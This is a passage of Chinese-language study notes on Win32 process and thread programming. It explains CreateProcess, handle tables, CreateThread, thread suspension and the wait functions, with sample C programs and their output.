<h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CreateChildProcess</span><span class="params">(PTCHAR szChildProcessName, PTCHAR szCommandLine)</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si;					<span class="comment">// 记录程序有多大</span></span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建子进程，返回成功与失败</span></span><br><span class="line">	<span class="keyword">if</span> (!CreateProcess(</span><br><span class="line">		szChildProcessName,		<span class="comment">// 对象名称</span></span><br><span class="line">		szCommandLine,			<span class="comment">// 命令行</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 不继承进程句柄</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 不继承线程句柄</span></span><br><span class="line">		FALSE,					<span class="comment">// 不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,						<span class="comment">// 没有创建标志</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 使用父进程环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,					<span class="comment">// 使用父进程目录作为当前目录，可以自己设置目录</span></span><br><span class="line">		&amp;si,					<span class="comment">// STARTUPINFO结构体详细信息</span></span><br><span class="line">		&amp;pi)					<span class="comment">// PROCESS_INFORMATION结构体进程信息</span></span><br><span class="line">		)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreatChildProcess Error:%d \n&quot;</span>, GetLastError);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	TCHAR szApplicationName[] = TEXT(<span class="string">&quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&quot;</span>);</span><br><span class="line">	TCHAR szCmdline[] = TEXT(<span class="string">&quot;https://baidu.com&quot;</span>);</span><br><span class="line">	CreateChildProcess(szApplicationName, <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="句柄表"><a href="#句柄表" class="headerlink" title="句柄表"></a>句柄表</h3><p>句柄表存储的就是一种映射关系，每个进程的内核对象对应一个句柄，用户不能直接访问内核对象（如果用户给了一个错误的内核地址会蓝屏）。为了防止访问错误的内核对象地址，Windows在用户层和内核层中间加了一个句柄表，用户通过访问句柄表来访问内核对象，句柄表相当于一道内核层外的防火墙。</p>
<img src="/2024/07/05/Win32API/image-20240304202133292.png" alt="image-20240304202133292" style="zoom:67%;">

<p>句柄表是一张私有的表，只针对当前的进程才有意义。</p>
<p><img src="/2024/07/05/Win32API/image-20240304222323428.png" alt="image-20240304222323428"></p>
<p>如果是CloseHandle的话，内核对象不会死，而是内核对象的计数器减一（当有多个对象都运行了内核对象A）。如果所有的进程都把内核对象杀掉，也就是内核对象的计数变成0的时候，这个内核对象就会被销毁。</p>
<p>进程里有线程，线程不死，进程就不会死；如果进程里的唯一线程死了，进程就死了。</p>
<h3 id="进程相关API"><a href="#进程相关API" class="headerlink" title="进程相关API"></a>进程相关API</h3><h4 id="ID与句柄表"><a href="#ID与句柄表" class="headerlink" title="ID与句柄表"></a>ID与句柄表</h4><p>进程ID——PID，使用程序将进程ID打印出来为16进制，比如0x2914，转换成十进制是10516，也就是这里的资源管理器</p>
<img src="/2024/07/05/Win32API/image-20240305100538731.png" alt="image-20240305100538731" style="zoom:50%;">

<p>句柄表</p>
<p>句柄表是一个程序私有的，如果通过另一个程序关掉另一个程序，不能使用被关闭进程的句柄表，因为这个句柄表是私有的，程序A无法通过程序B的句柄表关闭程序B。</p>
<p>比如，程序A的句柄是0xf0,<img src="/2024/07/05/Win32API/image-20240305145458857.png" alt="image-20240305145458857" style="zoom:67%;"></p>
<p>此时如果用程序B来关闭程序A：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	hProcess = (HANDLE)<span class="number">0xf0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">1</span>))</span><br><span class="line">	&#123;				</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;终止程序失败 %d \n&quot;</span>, GetLastError());		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">终止程序失败：6</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/Win32API/image-20240305150145954.png" alt="image-20240305150145954" style="zoom:33%;"> 返回这个值说明句柄无效，因为0xf0是A的私有句柄</p>
<p>但是，进程ID（dwProcessID）是公有的，所以还是可以通过使用PID来终止程序。</p>
<h3 id="以挂起形式创建进程"><a href="#以挂起形式创建进程" class="headerlink" title="以挂起形式创建进程"></a>以挂起形式创建进程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">	LPCTSTR lpApplicationName.						<span class="comment">//name of exeutable module</span></span></span><br><span class="line"><span class="params">	LPTSTR lpCommandLine,							<span class="comment">//command line string</span></span></span><br><span class="line"><span class="params">	LPSECURITY_ATTRIBUTES lpProcessAttributes,		<span class="comment">//SD</span></span></span><br><span class="line"><span class="params">	LPSECURITY_ATTRIBUTES lpThreadAttributes,		<span class="comment">//SD</span></span></span><br><span class="line"><span class="params">	BOOL bInheritHandles,							<span class="comment">//handle inheritance option</span></span></span><br><span class="line"><span class="params">	**DWORD dwCreationFlags,**							<span class="comment">//creation flags</span></span></span><br><span class="line"><span class="params">	LPVOID lpEnvironment,							<span class="comment">//new environment block</span></span></span><br><span class="line"><span class="params">	LPCTSTR lpCurrentDirectory,						<span class="comment">//current directory name</span></span></span><br><span class="line"><span class="params">	LPSTARTUPINFO lpStartupInfo,					<span class="comment">//startup information</span></span></span><br><span class="line"><span class="params">	LPPROCESS_INFOMATION lpProcessInformation		<span class="comment">//process information</span></span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>在dwCreationFlags中，如果值为0，那么父进程和子进程是共用一个控制台的，如果要父进程和子进程分别打开一个控制台，那么需要将dwCreationFlags设置为<code>CREATE_NEW_CONSOLE</code>。**其中有一个值为<code>CREATE_SUSPENDED:</code>**以挂起的形式创建一个进程</p>
<h3 id="模块目录与工作目录"><a href="#模块目录与工作目录" class="headerlink" title="模块目录与工作目录"></a>模块目录与工作目录</h3><p>两个API：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GetModuleFileName		<span class="comment">//获取模块路径</span></span><br><span class="line">GetCurrentDirectory		<span class="comment">//获取工作路径</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> strModule[<span class="number">256</span>];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>, strModule, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> strWork[<span class="number">1000</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">1000</span>;</span><br><span class="line">	GetCurrentDirectory(<span class="number">1000</span>, strWork);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;模块路径：%s\n工作路径：%s\n&quot;</span>, strModule, strWork);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模块路径：C:\Users\23394\Desktop\code\C C++\win32AP\Debug\win32AP.exe</span><br><span class="line">工作路径：C:\Users\23394\Desktop\code\C C++\win32AP</span><br></pre></td></tr></table></figure>

<p>模块路径就是exe所在位置，工作路径由创建这个模块的父进程填写</p>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><h3 id="线程-1"><a href="#线程-1" class="headerlink" title="线程"></a>线程</h3><p>线程是附属在进程上的执行实体，是代码的执行流程</p>
<p>一个进程可以包含多个线程，但一个进程至少包含一个线程</p>
<h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><p><strong>CreateThread</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]            SIZE_T                  dwStackSize,</span></span><br><span class="line"><span class="params">  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,</span></span><br><span class="line"><span class="params">  [in, optional]  __drv_aliasesMem LPVOID lpParameter,</span></span><br><span class="line"><span class="params">  [in]            DWORD                   dwCreationFlags,</span></span><br><span class="line"><span class="params">  [out, optional] LPDWORD                 lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>创建一个线程：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line"></span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, ThreadProc,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>DWORD WINAPI ThreadProc(LPVOID lpParameter)</code>这个函数可以没有返回值和参数，但是在使用时需要强制转换成<code>(LPTHREAD_START_ROUTINE)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> WINAPI <span class="title function_">ThreadProc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line"></span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程也可以传入参数，参数可以是任何类型，只要自己强制转换一个类型即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, ThreadProc,(LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上函数通过闯传入一个int类型指针，先强转成LPTHREAD_START_ROUTINE类型，传入一个指针，再在线程中将这个指针转换成自己需要的类型即可。</p>
<h3 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h3><p>让自己停下来<code>Sleep()</code>，停止当前线程。<br>让别的线程停下来<code>SuspendThread(hThread)</code><br>线程恢复<code>ResumeThread</code></p>
<p>线程挂起几次就要继续几次，如果挂起两次，就要继续两次才能继续执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">handles</span> &#123;</span></span><br><span class="line">	HANDLE h1;</span><br><span class="line">	HANDLE h2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc3</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">handles</span>* <span class="title">hp</span> =</span> (handles*)lpParameter;</span><br><span class="line">	SuspendThread(hp-&gt;h1);</span><br><span class="line">	Sleep(<span class="number">5000</span>);</span><br><span class="line">	ResumeThread(hp-&gt;h1);</span><br><span class="line">	SuspendThread(hp-&gt;h2);</span><br><span class="line">	Sleep(<span class="number">5000</span>);</span><br><span class="line">	ResumeThread(hp-&gt;h2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread1;</span><br><span class="line">	hThread1 = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, ThreadProc1,(LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">30</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread2;</span><br><span class="line">	hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">handles</span> <span class="title">Handles</span>;</span></span><br><span class="line">	Handles.h1 = hThread1;</span><br><span class="line">	Handles.h2 = hThread2;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">handles</span>* <span class="title">ph</span> =</span> &amp;Handles;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread3;</span><br><span class="line">	hThread3 = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc3, (LPTHREAD_START_ROUTINE)ph, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	Sleep(<span class="number">200000000</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread1);</span><br><span class="line">	CloseHandle(hThread2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上是一个线程交替的实例。</p>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++++1</span><br><span class="line">++++++++++2</span><br><span class="line">++++++++++3</span><br><span class="line">++++++++++4</span><br><span class="line">++++++++++5</span><br><span class="line">++++++++++6</span><br><span class="line">++++++++++7</span><br><span class="line">++++++++++8</span><br><span class="line">++++++++++9</span><br><span class="line">----------1</span><br><span class="line">----------2</span><br><span class="line">----------3</span><br><span class="line">----------4</span><br><span class="line">----------5</span><br><span class="line">----------6</span><br><span class="line">----------7</span><br><span class="line">----------8</span><br><span class="line">----------9</span><br><span class="line">++++++++++10</span><br><span class="line">----------10</span><br><span class="line">++++++++++11</span><br><span class="line">++++++++++12</span><br><span class="line">++++++++++13</span><br><span class="line">++++++++++14</span><br><span class="line">++++++++++15</span><br><span class="line">++++++++++16</span><br><span class="line">++++++++++17</span><br><span class="line">++++++++++18</span><br><span class="line">++++++++++19</span><br><span class="line">++++++++++20</span><br><span class="line">++++++++++21</span><br><span class="line">++++++++++22</span><br><span class="line">++++++++++23</span><br><span class="line">++++++++++24</span><br><span class="line">++++++++++25</span><br><span class="line">++++++++++26</span><br><span class="line">++++++++++27</span><br><span class="line">++++++++++28</span><br><span class="line">++++++++++29</span><br><span class="line">++++++++++30</span><br></pre></td></tr></table></figure>

<h3 id="等待线程中的API"><a href="#等待线程中的API" class="headerlink" title="等待线程中的API"></a>等待线程中的API</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="number">1</span>&gt;WaitForSingleObject();</span><br><span class="line">&lt;<span class="number">2</span>&gt;WaitForMultiplePbjects();</span><br><span class="line">&lt;<span class="number">3</span>&gt;GetExitCodeThread();</span><br></pre></td></tr></table></figure>

<h4 id="WaitForSingleObject等待单个线程"><a href="#WaitForSingleObject等待单个线程" class="headerlink" title="WaitForSingleObject等待单个线程"></a>WaitForSingleObject等待单个线程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">WaitForSingleObject</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE hHandle,			<span class="comment">//handle to object	对象句柄</span></span></span><br><span class="line"><span class="params">	DWORD dwMilliseconds	<span class="comment">//time-out interval 超时时间间隔</span></span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>执行这个函数的时候，这个函数所在的当前线程会阻塞，等待WaitForSingleObject中传入的线程执行完毕后，WaitForSingleObject后面的程序才会执行。</p>
<img src="/2024/07/05/Win32API/image-20240305222427024.png" alt="image-20240305222427024" style="zoom:50%;">

<h4 id="WaitForMultiplePbjects等待多个线程"><a href="#WaitForMultiplePbjects等待多个线程" class="headerlink" title="WaitForMultiplePbjects等待多个线程"></a>WaitForMultiplePbjects等待多个线程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">WaitForMultipleObjects</span><span class="params">(</span></span><br><span class="line"><span class="params">	DWORD        nCount,			<span class="comment">//等待几个线程对象</span></span></span><br><span class="line"><span class="params">	<span class="type">const</span> HANDLE *lpHandles,		<span class="comment">//线程数组</span></span></span><br><span class="line"><span class="params">	BOOL         bWaitAll,			<span class="comment">//等待模式 TRUE/FALSE前者为全部线程状态都发生改变，后者为有任意一个线程状态发生改变</span></span></span><br><span class="line"><span class="params">	DWORD        dwMilliseconds		<span class="comment">//超时时间，一直等待为INFINITE</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6387)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE harrThreadArray[<span class="number">2</span>];</span><br><span class="line">	harrThreadArray[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, (LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	harrThreadArray[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//WaitForSingleObject(hThread1,INFINITE);</span></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, harrThreadArray, TRUE, INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程执行完毕\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;其他程序...&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetExitCodeThread读取线程返回值"><a href="#GetExitCodeThread读取线程返回值" class="headerlink" title="GetExitCodeThread读取线程返回值"></a>GetExitCodeThread读取线程返回值</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">GetExitCodeThread</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE  hThread,</span></span><br><span class="line"><span class="params">	LPDWORD lpExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

